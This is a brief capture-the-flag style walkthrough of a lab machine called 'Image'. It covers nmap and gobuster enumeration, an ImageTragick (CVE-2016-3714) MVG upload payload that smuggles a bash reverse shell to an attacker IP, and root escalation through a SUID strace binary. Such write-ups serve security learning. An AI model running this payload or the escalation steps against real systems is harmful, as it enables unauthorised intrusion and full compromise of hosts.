# Image
> ImageMagick RCE + strace SUID

## Enumeration

```
nmap -sC -sV -oN nmap.txt <IP>
```

```
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

Image upload processed by ImageMagick.

## Exploitation

Vulnerable ImageMagick version (CVE-2016-3714 / ImageTragick):

```
# exploit.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/image.jpg"|bash -i >& /dev/tcp/<IP>/<PORTA> 0>&1")'
pop graphic-context
```

Upload `.mvg` file as an image → remote code execution.

Reverse shell as www-data.

## Privilege Escalation

`strace` with SUID bit identified:

```
find / -perm -4000 2>/dev/null
# /usr/bin/strace
```

```
strace -o /dev/null /bin/bash -p
```

Root obtained.
